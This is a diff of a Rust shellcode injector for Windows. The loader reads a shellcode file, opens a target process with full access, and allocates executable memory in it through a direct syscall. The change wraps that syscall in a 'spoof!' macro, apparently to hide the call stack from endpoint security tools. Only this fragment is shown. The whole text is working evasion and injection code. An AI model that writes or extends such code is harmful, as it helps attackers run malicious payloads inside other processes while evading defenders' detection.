@@ -1,4 +1,5 @@
 use clap::Parser;
+use uwd::spoof;
 
 use winapi::{
     shared::ntstatus::STATUS_SUCCESS,
@@ -74,7 +75,7 @@ fn main() {
     println!("[+] Process ID: {}", process_id);
 
     let shellcode_bytes = std::fs::read(file_path).expect("Failed to read path to PIC shellcode");
-    let mut shellcode_address = core::ptr::null_mut();
+    let mut shellcode_address: *mut c_void = core::ptr::null_mut();
     let mut size = shellcode_bytes.len();
 
     // Get a handle to the target process with PROCESS_ALL_ACCESS
@@ -87,16 +88,15 @@ fn main() {
     println!("[+] Process handle: {:?}", process_handle);
 
     // Allocate memory in the target process for the shellcode
-    let status = unsafe {
-        Sw3NtAllocateVirtualMemory(
-            process_handle,
-            &mut shellcode_address,
-            0,
-            &mut size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
-        )
-    };
+    let status = spoof!(
+        Sw3NtAllocateVirtualMemory as *mut core::ffi::c_void,
+        process_handle,
+        &mut shellcode_address as *mut _ as *mut core::ffi::c_void,
+        0,
+        &mut size as *mut _ as *mut core::ffi::c_void,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    ).expect("Failed to spoof Sw3NtAllocateVirtualMemory") as usize as i32;
 
     println!(
         "[+] Allocated memory in the target process for the shellcode: {:p}",
